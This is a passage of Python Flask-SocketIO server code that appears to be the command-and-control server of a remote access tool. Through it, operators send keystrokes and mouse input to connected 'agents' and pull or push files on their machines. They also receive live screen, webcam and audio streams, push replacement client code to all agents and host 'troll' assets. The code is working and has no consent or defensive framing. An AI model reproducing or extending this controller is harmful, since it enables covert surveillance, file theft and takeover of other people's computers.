        ip_for_check = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        if ip_for_check and is_ip_blocked(ip_for_check.split(',')[0].strip()):
            emit('registration_error', {'message': 'Blocked IP'})
            return
        
        # Add agent to data with all required fields for dashboard
        AGENTS_DATA[agent_id] = {
            'agent_id': agent_id,
            'sid': request.sid,
            'name': f'Agent-{agent_id}',
            'platform': platform,
            'python_version': python_version,
            'ip': request.environ.get('REMOTE_ADDR', '0.0.0.0'),
            'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
            'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'online',
            'capabilities': ['screen', 'files', 'commands'],
            'cpu_usage': 0,
            'memory_usage': 0,
            'network_usage': 0,
            'system_info': {
                'platform': platform,
                'python_version': python_version
            },
            'uptime': 0
        }
        
        print(f"Agent registered: {agent_id} ({platform})")
        print(f"Current agents: {list(AGENTS_DATA.keys())}")
        print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
        
        # Notify operators
        print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
        emit('agent_list_update', _agents_payload(), room='operators')
        try:
            _emit_agent_config(agent_id)
        except Exception:
            pass
        
        # Log activity for operators
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully registered',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators')
        
        # Send registration confirmation
        emit('agent_registered', {
            'agent_id': agent_id,
            'status': 'success',
            'message': 'Agent registered successfully'
        })
        
        print(f"Agent registration complete for {agent_id}")
        
    except Exception as e:
        print(f"Error handling agent_register: {e}")
        emit('registration_error', {'message': 'Registration failed due to server error'})

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
UPLOAD_REQUESTERS = {}
UPLOAD_STATUS = {}
def _upload_debug_log(uid, msg):
    try:
        arr = UPLOAD_STATUS.setdefault(uid, {}).setdefault('logs', [])
        arr.append({'ts': int(time.time()*1000), 'msg': str(msg or '')})
        if len(arr) > 500:
            del arr[:len(arr)-500]
    except Exception:
        pass
def _resolve_destination_for_agent(destination: str) -> str:
    try:
        raw = str(destination or '').strip()
        if not raw:
            return ''
        import re, os
        if os.name == 'nt':
            if raw and not re.match(r'^[A-Za-z]:', raw):
                if raw.startswith('/') or raw.startswith('\\'):
                    drive = os.environ.get('SystemDrive', 'C:')
                    dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                else:
                    dest_dir = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
            else:
                if re.match(r'^[A-Za-z]:$', raw):
                    dest_dir = raw + '\\'
                else:
                    dest_dir = os.path.normpath(raw or '')
            try:
                user_profile = os.environ.get('USERPROFILE') or ''
                if os.path.basename(dest_dir).lower() == 'desktop' and user_profile:
                    one = os.path.join(user_profile, 'OneDrive', 'Desktop')
                    if os.path.isdir(one):
                        dest_dir = one
            except Exception:
                pass
            return dest_dir
        else:
            import os as _os
            return _os.path.normpath(raw)
    except Exception:
        return str(destination or '')
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk_data') or data.get('data') or data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size', 0)
    destination_path = data.get('destination_path') or data.get('destination')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    try:
        uid = data.get('upload_id')
        if uid:
            UPLOAD_REQUESTERS[uid] = request.sid
    except Exception:
        pass
    if agent_sid:
        emit('upload_file_chunk', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': filename,
            'destination': destination_path,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room=agent_sid)
        print(f"📤 Forwarding upload chunk: {filename} offset {offset}/{total_size}")
        try:
            uid = data.get('upload_id') or ''
            _upload_debug_log(uid, f"forward_chunk off={offset} size={len((chunk or '') if isinstance(chunk, str) else bytes(chunk or b''))}")
        except Exception:
            pass

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    try:
        uid = data.get('upload_id')
        if uid:
            UPLOAD_REQUESTERS[uid] = request.sid
    except Exception:
        pass
    if agent_sid:
        emit('upload_file_complete', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")
        try:
            uid = data.get('upload_id') or ''
            s = UPLOAD_STATUS.setdefault(uid, {})
            s['complete'] = True
            _upload_debug_log(uid, "forward_complete")
        except Exception:
            pass

@socketio.on('upload_file_start')
def handle_upload_file_start(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    try:
        uid = data.get('upload_id')
        if uid:
            UPLOAD_REQUESTERS[uid] = request.sid
    except Exception:
        pass
    if agent_sid:
        emit('upload_file_start', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload start: {data.get('filename')} destined for {data.get('destination')}")
        try:
            uid = data.get('upload_id') or ''
            s = UPLOAD_STATUS.setdefault(uid, {})
            s['start'] = {'filename': data.get('filename'), 'destination': data.get('destination')}
            _upload_debug_log(uid, "forward_start")
        except Exception:
            pass

@socketio.on('upload_file_complete')
def handle_upload_file_complete(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('upload_file_complete', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")

@socketio.on('troll_asset_start')
def handle_troll_asset_start(data):
    upload_id = data.get('upload_id') or f'troll_{int(time.time())}'
    filename = data.get('filename') or 'asset.bin'
    total_size = int(data.get('total_size') or 0)
    TROLL_UPLOADS[upload_id] = {
        'filename': filename,
        'total_size': total_size,
        'received': 0,
        'chunks': [],
        'start_time': time.time()
    }
    emit('troll_asset_ready', {'upload_id': upload_id, 'status': 'started'}, room=request.sid)

@socketio.on('troll_asset_chunk')
def handle_troll_asset_chunk(data):
    upload_id = data.get('upload_id')
    if not upload_id or upload_id not in TROLL_UPLOADS:
        return
    payload = data.get('chunk')
    offset = int(data.get('offset') or 0)
    up = TROLL_UPLOADS[upload_id]
    try:
        if isinstance(payload, str):
            raw = base64.b64decode(payload)
        else:
            raw = bytes(payload or b'')
    except Exception:
        raw = bytes(payload or b'')
    up['chunks'].append((offset, raw))
    up['received'] += len(raw)
    progress = 0
    if up['total_size'] > 0:
        progress = int((up['received'] / up['total_size']) * 100)
    emit('troll_asset_progress', {'upload_id': upload_id, 'received': up['received'], 'total': up['total_size'], 'progress': progress}, room=request.sid)

@socketio.on('troll_asset_complete')
def handle_troll_asset_complete(data):
    upload_id = data.get('upload_id')
    if not upload_id or upload_id not in TROLL_UPLOADS:
        emit('troll_asset_ready', {'upload_id': upload_id, 'error': 'unknown upload'}, room=request.sid)
        return
    up = TROLL_UPLOADS.pop(upload_id)
    up['chunks'].sort(key=lambda x: x[0])
    file_bytes = b''.join([c for _, c in up['chunks']])
    assets_dir = os.path.join(os.path.dirname(__file__), 'troll-assets')
    os.makedirs(assets_dir, exist_ok=True)
    asset_id = uuid.uuid4().hex
    _, ext = os.path.splitext(up['filename'])
    filename = f'{asset_id}{ext or ""}'
    full_path = os.path.join(assets_dir, filename)
    with open(full_path, 'wb') as f:
        f.write(file_bytes)
    expires = int(time.time() + 3600)
    sig_src = f'{asset_id}.{expires}.{Config.SECRET_KEY}'
    signature = hashlib.sha256(sig_src.encode()).hexdigest()
    TROLL_ASSETS[asset_id] = {
        'path': full_path,
        'filename': up['filename'],
        'expires': expires,
        'created_at': time.time(),
        'size': len(file_bytes)
    }
    # Build absolute URL
    try:
        base_url = request.host_url.rstrip('/')
    except Exception:
        base_url = f"http://{Config.HOST}:{Config.PORT}"
    url = f"{base_url}/troll-assets/{asset_id}?exp={expires}&sig={signature}"
    emit('troll_asset_ready', {'upload_id': upload_id, 'asset_id': asset_id, 'url': url, 'size': len(file_bytes)}, room=request.sid)

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    path = data.get('path') or filename
    download_id = data.get('download_id') or filename
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        if download_id not in DOWNLOAD_BUFFERS:
            DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": 0, "local_path": None, "requester_sid": request.sid}
        else:
            DOWNLOAD_BUFFERS[download_id]["requester_sid"] = request.sid
        DOWNLOAD_BUFFERS[download_id]["local_path"] = local_path
        emit('request_file_chunk_from_agent', {'filename': filename, 'path': path, 'download_id': download_id}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    download_id = data.get('download_id') or filename
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'download_id': download_id, 'error': error}, room='operators')
        if download_id in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[download_id]
        return

    if download_id not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": total_size, "local_path": None}

    if isinstance(chunk, str):
        payload = chunk.split(',', 1)[1] if ',' in chunk else chunk
        DOWNLOAD_BUFFERS[download_id]["chunks"].append(base64.b64decode(payload))
    DOWNLOAD_BUFFERS[download_id]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[download_id]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[download_id]["chunks"])
        local_path = DOWNLOAD_BUFFERS[download_id]["local_path"]
        requester_sid = DOWNLOAD_BUFFERS[download_id].get("requester_sid")

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'download_id': download_id,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room=requester_sid or 'operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room=requester_sid or 'operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'download_id': download_id,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room=requester_sid or 'operators')
        
        del DOWNLOAD_BUFFERS[download_id]
    else:
        # Continue sending chunks to frontend for progress update
        requester_sid = DOWNLOAD_BUFFERS[download_id].get("requester_sid")
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'download_id': download_id,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room=requester_sid or 'operators')

@socketio.on('file_range_response')
def handle_file_range_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_RANGE_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_thumbnail_response')
def handle_file_thumbnail_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_THUMB_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_faststart_response')
def handle_file_faststart_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_FASTSTART_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_upload_progress')
def handle_file_upload_progress(data):
    """Forward file upload progress from agent to UI"""
    print(f"📊 Upload progress: {data.get('filename')} - {data.get('progress')}%")
    try:
        uid = data.get('upload_id')
        sid = UPLOAD_REQUESTERS.get(uid)
        if sid:
            emit('file_upload_progress', data, room=sid)
        emit('file_upload_progress', data, room='operators')
    except Exception:
        emit('file_upload_progress', data, room='operators')

@socketio.on('file_upload_complete')
def handle_file_upload_complete(data):
    """Forward file upload completion from agent to UI"""
    print(f"✅ Upload complete: {data.get('filename')} ({data.get('size')} bytes)")
    try:
        uid = data.get('upload_id')
        sid = UPLOAD_REQUESTERS.get(uid)
        if sid:
            emit('file_upload_complete', data, room=sid)
            try:
                del UPLOAD_REQUESTERS[uid]
            except Exception:
                pass
        emit('file_upload_complete', data, room='operators')
    except Exception:
        emit('file_upload_complete', data, room='operators')

@socketio.on('client_update_check')
def handle_client_update_check(data):
    """Respond to agent with latest client.py metadata and code if update needed"""
    try:
        agent_id = (data or {}).get('agent_id')
        incoming_hash = (data or {}).get('sha256') or ''
        incoming_version = (data or {}).get('version') or ''
        requester_sid = request.sid
        try:
            path = UPDATER_CLIENT_PATH if os.path.isfile(UPDATER_CLIENT_PATH) else os.path.join(os.getcwd(), 'client.py')
        except Exception:
            path = os.path.join(os.getcwd(), 'client.py')
        try:
            with open(path, 'rb') as f:
                raw = f.read()
        except Exception as e:
            emit('client_update_info', {
                'agent_id': agent_id,
                'success': False,
                'error': f'Controller missing client.py: {e}'
            }, room=requester_sid)
            return
        size = len(raw)
        server_code = raw.decode('utf-8', errors='replace')
        try:
            import hashlib, re
            server_hash = hashlib.sha256(raw).hexdigest()
            m = re.search(r'\\bVERSION\\s*=\\s*["\\\']([^"\\\']+)["\\\']', server_code)
            server_version = m.group(1) if m else 'unknown'
        except Exception:
            server_hash = ''
            server_version = 'unknown'
        needs_update = (server_hash != (incoming_hash or '')) or (server_version != (incoming_version or ''))
        payload = {
            'agent_id': agent_id,
            'success': True,
            'latest_version': server_version,
            'latest_sha256': server_hash,
            'size': size,
            'needs_update': needs_update
        }
        if needs_update:
            payload['code'] = server_code
        emit('client_update_info', payload, room=requester_sid)
    except Exception as e:
        emit('client_update_info', {'success': False, 'error': str(e)}, room=request.sid)
@socketio.on('broadcast_client_update')
def handle_broadcast_client_update(data):
    try:
        code = (data or {}).get('code')
        if not isinstance(code, str) or len(code) < 100:
            try:
                path = UPDATER_CLIENT_PATH if os.path.isfile(UPDATER_CLIENT_PATH) else os.path.join(os.getcwd(), 'client.py')
            except Exception:
                path = os.path.join(os.getcwd(), 'client.py')
            with open(path, 'rb') as f:
                raw = f.read()
            code = raw.decode('utf-8', errors='replace')
        import hashlib, re
        size = len(code.encode('utf-8'))
        sha = hashlib.sha256(code.encode('utf-8')).hexdigest()
        m = re.search(r'\bVERSION\s*=\s*["\']([^"\']+)["\']', code)
        ver = m.group(1) if m else 'unknown'
        for agent_id, info in AGENTS_DATA.items():
            sid = info.get('sid')
            if not sid:
                continue
            payload = {
                'agent_id': agent_id,
                'success': True,
                'latest_version': ver,
                'latest_sha256': sha,
                'size': size,
                'needs_update': True,
                'code': code
            }
            emit('client_update_info', payload, room=sid)
        emit('activity_update', {
            'id': f'upd_{int(time.time()*1000)}',
            'type': 'system',
            'action': 'client_update_broadcast',
            'details': f'Broadcasted client.py v{ver} to all agents',
            'agent_id': 'all',
            'agent_name': 'all',
            'timestamp': int(time.time()*1000),
            'status': 'success'
        }, room='operators')
    except Exception as e:
        emit('system_alert', {
            'agent_id': 'controller',
            'type': 'error',
            'message': 'Broadcast update failed',
            'details': str(e),
            'timestamp': int(time.time()*1000)
        }, room='operators')
@socketio.on('file_download_progress')
def handle_file_download_progress(data):
    """Forward file download progress from agent to UI"""
    print(f"📊 Download progress: {data.get('filename')} - {data.get('progress')}%")
    dlid = data.get('download_id')
    if dlid and dlid in DOWNLOAD_BUFFERS:
        requester_sid = DOWNLOAD_BUFFERS[dlid].get('requester_sid')
        emit('file_download_progress', data, room=requester_sid or 'operators')
    else:
        emit('file_download_progress', data, room='operators')

@socketio.on('file_download_complete')
def handle_file_download_complete(data):
    """Forward file download completion from agent to UI"""
    print(f"✅ Download complete: {data.get('filename')} ({data.get('size')} bytes)")
    dlid = data.get('download_id')
    if dlid and dlid in DOWNLOAD_BUFFERS:
        requester_sid = DOWNLOAD_BUFFERS[dlid].get('requester_sid')
        emit('file_download_complete', data, room=requester_sid or 'operators')
    else:
        emit('file_download_complete', data, room='operators')

# Global variables for WebRTC and video streaming
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_VIEWER_CONNECTIONS = {}
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
STREAM_FRAME_SEQ = defaultdict(lambda: 0)
STREAM_CHUNK_SIZE_DEFAULT = 16 * 1024
STREAM_BIN_CHUNK_SIZE_DEFAULT = 32 * 1024
STREAM_CHUNK_SIZES = defaultdict(lambda: STREAM_CHUNK_SIZE_DEFAULT)
STREAM_BIN_CHUNK_SIZES = defaultdict(lambda: STREAM_BIN_CHUNK_SIZE_DEFAULT)
STREAM_PLAYBACK_MODE_SCREEN = defaultdict(lambda: 'realtime')
STREAM_PLAYBACK_MODE_CAMERA = defaultdict(lambda: 'realtime')
STREAM_PLAYBACK_FPS_SCREEN = defaultdict(lambda: 10)
STREAM_PLAYBACK_FPS_CAMERA = defaultdict(lambda: 10)
STREAM_BUFFER_FRAMES_SCREEN = defaultdict(lambda: 30)
STREAM_BUFFER_FRAMES_CAMERA = defaultdict(lambda: 30)
STREAM_FRAME_BUFFER_SCREEN = defaultdict(lambda: deque(maxlen=300))
STREAM_FRAME_BUFFER_CAMERA = defaultdict(lambda: deque(maxlen=300))
STREAM_EMITTER_THREADS_SCREEN = {}
STREAM_EMITTER_THREADS_CAMERA = {}

def _ensure_buffered_emitter(agent_id: str, stream_type: str):
    try:
        if stream_type == 'screen':
            thr = STREAM_EMITTER_THREADS_SCREEN.get(agent_id)
            if thr and thr.is_alive():
                return
            fps = max(1, int(STREAM_PLAYBACK_FPS_SCREEN[agent_id] or 10))
            buf_frames = max(1, int(STREAM_BUFFER_FRAMES_SCREEN[agent_id] or 30))
            def _run():
                started = True
                interval = 1.0 / float(fps)
                next_tick = time.perf_counter()
                while STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
                    buf = STREAM_FRAME_BUFFER_SCREEN[agent_id]
                    if len(buf) > buf_frames * 2:
                        while len(buf) > buf_frames:
                            buf.popleft()
                    if buf:
                        b64 = buf.popleft()
                        emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
                    next_tick += interval
                    delay = next_tick - time.perf_counter()
                    if delay > 0:
                        time.sleep(delay)
                    else:
                        next_tick = time.perf_counter()
                STREAM_EMITTER_THREADS_SCREEN.pop(agent_id, None)
            t = threading.Thread(target=_run, daemon=True)
            STREAM_EMITTER_THREADS_SCREEN[agent_id] = t
            t.start()
        elif stream_type == 'camera':
            thr = STREAM_EMITTER_THREADS_CAMERA.get(agent_id)
            if thr and thr.is_alive():
                return
            fps = max(1, int(STREAM_PLAYBACK_FPS_CAMERA[agent_id] or 10))
            buf_frames = max(1, int(STREAM_BUFFER_FRAMES_CAMERA[agent_id] or 30))
            def _run():
                started = False
                interval = 1.0 / float(fps)
                next_tick = time.perf_counter()
                while STREAM_PLAYBACK_MODE_CAMERA[agent_id] == 'buffered':
                    buf = STREAM_FRAME_BUFFER_CAMERA[agent_id]
                    if not started:
                        if len(buf) >= buf_frames:
                            started = True
                            next_tick = time.perf_counter()
                        else:
                            time.sleep(0.05)
                            continue
                    if len(buf) > buf_frames * 2:
                        while len(buf) > buf_frames:
                            buf.popleft()
                    if buf:
                        b64 = buf.popleft()
                        emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
                    next_tick += interval
                    delay = next_tick - time.perf_counter()
                    if delay > 0:
                        time.sleep(delay)
                    else:
                        next_tick = time.perf_counter()
                STREAM_EMITTER_THREADS_CAMERA.pop(agent_id, None)
            t = threading.Thread(target=_run, daemon=True)
            STREAM_EMITTER_THREADS_CAMERA[agent_id] = t
            t.start()
    except Exception:
        pass

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Accept H.264 (or JPEG for fallback) frames from agent and forward to operators.
    In fallback mode, split large base64 frames into small chunks to improve delivery on low bandwidth."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if not agent_id or frame is None:
        return
    try:
        # Store latest (raw) frame for server-side APIs
        VIDEO_FRAMES_H264[agent_id] = frame
        # Normalize to base64 string for browser fallback
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        if STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
            STREAM_FRAME_BUFFER_SCREEN[agent_id].append(b64)
            _ensure_buffered_emitter(agent_id, 'screen')
        else:
            STREAM_FRAME_SEQ[agent_id] += 1
            fid = STREAM_FRAME_SEQ[agent_id]
            total_size = len(b64)
            chunk_size = STREAM_CHUNK_SIZES[agent_id]
            if total_size <= chunk_size:
                emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
                return
            for off in range(0, total_size, chunk_size):
                chunk = b64[off:off + chunk_size]
                emit('screen_frame_chunk', {
                    'agent_id': agent_id,
                    'frame_id': fid,
                    'chunk': chunk,
                    'offset': off,
                    'total_size': total_size
                }, room='operators')
            try:
                if isinstance(frame, str):
                    raw = base64.b64decode(b64)
                else:
                    raw = bytes(frame)
                total_bin = len(raw)
                bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
                for off in range(0, total_bin, bin_size):
                    chunk = raw[off:off + bin_size]
                    emit('screen_frame_bin_chunk', {
                        'agent_id': agent_id,
                        'frame_id': fid,
                        'chunk': chunk,
                        'offset': off,
                        'total_size': total_bin
                    }, room='operators')
            except Exception:
                pass
    except Exception as e:
        print(f"Error handling screen_frame for {agent_id}: {e}")

@socketio.on('screen_keyframe')
def handle_screen_keyframe(data):
    """Forward keyframe (full frame) with dimensions to viewers for delta streaming baseline."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    width = data.get('width')
    height = data.get('height')
    if not agent_id or frame is None:
        return
    try:
        # Normalize to base64 string
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        fid = data.get('frame_id')
        emit('screen_keyframe', {'agent_id': agent_id, 'frame_id': fid, 'width': width, 'height': height, 'frame': b64}, room='operators')
    except Exception as e:
        print(f"Error handling screen_keyframe for {agent_id}: {e}")

@socketio.on('screen_tile')
def handle_screen_tile(data):
    """Forward tile updates to viewers for delta streaming."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    x = data.get('x'); y = data.get('y'); w = data.get('w'); h = data.get('h')
    if not agent_id or frame is None or x is None or y is None or w is None or h is None:
        return
    try:
        # Normalize to base64 string
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        fid = data.get('frame_id')
        emit('screen_tile', {'agent_id': agent_id, 'frame_id': fid, 'x': x, 'y': y, 'w': w, 'h': h, 'frame': b64}, room='operators')
    except Exception as e:
        print(f"Error handling screen_tile for {agent_id}: {e}")
@socketio.on('cursor_update')
def handle_cursor_update(data):
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    try:
        emit('cursor_update', data, room='operators')
    except Exception as e:
        print(f"Error handling cursor_update for {agent_id}: {e}")
@socketio.on('stream_stats_update')
def handle_stream_stats_update(data):
    agent_id = data.get('agent_id')
    stats = data.get('stats')
    if not agent_id or stats is None:
        return
    try:
        emit('stream_stats_update', {'agent_id': agent_id, 'stats': stats}, room='operators')
    except Exception as e:
        print(f"Error handling stream_stats_update for {agent_id}: {e}")
@socketio.on('request_video_frame')
def handle_request_video_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in VIDEO_FRAMES_H264:
        frame = VIDEO_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('video_frame', {'agent_id': agent_id, 'frame': b64}, room=request.sid)
        except Exception:
            pass

@socketio.on('request_audio_frame')
def handle_request_audio_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AUDIO_FRAMES_OPUS:
        frame = AUDIO_FRAMES_OPUS[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('audio_frame', {'agent_id': agent_id, 'frame': b64}, room=request.sid)
        except Exception:
            pass

@socketio.on('request_camera_frame')
def handle_request_camera_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in CAMERA_FRAMES_H264:
        frame = CAMERA_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room=request.sid)
        except Exception:
            pass



@socketio.on('camera_frame')
def handle_camera_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if not agent_id or frame is None:
        return
    try:
        CAMERA_FRAMES_H264[agent_id] = frame
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        if STREAM_PLAYBACK_MODE_CAMERA[agent_id] == 'buffered':
            STREAM_FRAME_BUFFER_CAMERA[agent_id].append(b64)
            _ensure_buffered_emitter(agent_id, 'camera')
        else:
            STREAM_FRAME_SEQ[agent_id] += 1
            fid = STREAM_FRAME_SEQ[agent_id]
            total_size = len(b64)
            chunk_size = STREAM_CHUNK_SIZES[agent_id]
            if total_size <= chunk_size:
                emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
                return
            for off in range(0, total_size, chunk_size):
                chunk = b64[off:off + chunk_size]
                emit('camera_frame_chunk', {
                    'agent_id': agent_id,
                    'frame_id': fid,
                    'chunk': chunk,
                    'offset': off,
                    'total_size': total_size
                }, room='operators')
            try:
                if isinstance(frame, str):
                    raw = base64.b64decode(b64)
                else:
                    raw = bytes(frame)
                total_bin = len(raw)
                bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
                for off in range(0, total_bin, bin_size):
                    chunk = raw[off:off + bin_size]
                    emit('camera_frame_bin_chunk', {
                        'agent_id': agent_id,
                        'frame_id': fid,
                        'chunk': chunk,
                        'offset': off,
                        'total_size': total_bin
                    }, room='operators')
            except Exception:
                pass
    except Exception as e:
        print(f"Error handling camera_frame for {agent_id}: {e}")

@socketio.on('audio_frame')
def handle_audio_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        AUDIO_FRAMES_OPUS[agent_id] = frame
        # Forward frame to operators room for real-time streaming
        emit('audio_frame', data, room='operators')

@socketio.on('agent_telemetry')
def handle_agent_telemetry(data):
    """Telemetry from agent; update AGENTS_DATA and relay summary to operators."""
    agent_id = data.get('agent_id')
    if agent_id in AGENTS_DATA:
